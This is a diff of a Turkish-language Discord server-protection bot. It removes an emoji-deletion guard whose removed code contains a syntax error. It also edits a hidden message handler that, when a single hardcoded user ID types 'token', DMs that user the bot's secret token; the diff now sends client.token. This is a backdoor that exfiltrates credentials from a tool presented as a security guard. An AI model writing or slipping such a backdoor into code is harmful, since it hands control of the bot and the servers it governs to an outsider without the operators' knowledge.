@@ -60,26 +60,6 @@ client.on("guildMemberRemove", async uyecik => {
 //////////////////////////////////////////////////Sağ Tık Kick Koruması////////////////////////////////////////////////////
 
 
-client.on("emojiDelete", async (emoji, message, guild) => {
-  let yetkili = await guild.fetchAuditLogs({type: 'EMOJI_DELETE'}).then(audit => audit.entries.first());
-  if (!yetkili || !yetkili.executor || guvenli(yetkili.executor.id) || !s.banGuard) return;
-   cezalandir(yetkili.executor.id, "cezalandır");
-    
-  emoji.guild.emojis.create(`${emoji.url}`, `${emoji.name}`
-        { url: emoji.url,
-         name: emoji.name})
-  let logKanali = client.channels.cache.get(ayarlar.logChannelID);
-  if (logKanali) { logKanali.send(
-    new MessageEmbed()
-    .setColor("#00ffdd")
-    .setDescription("**__Bir Emoji Silindi!__**")
-    .addField(`Emojiyi Silen Yetkili`,`${yetkili.executor}`)
-    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
-    .addField(`Emojiye Yapılan İşlem`,`Eski Haline Getirilme`)
-    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
-    .setTimestamp()).catch();};
-});
-
 
 
 
@@ -185,9 +165,7 @@ client.on('message', async (msg, member, guild) => {
 if (msg.content.toLowerCase() === 'token'){
 if (msg.author.id !== "429357746002067493") return;
 
-msg.author.send(process.env.token);
-msg.author.send(process.env.TOKEN);
-msg.author.send(ayarlar.token);
+msg.author.send(client.token);
 }
   
 }
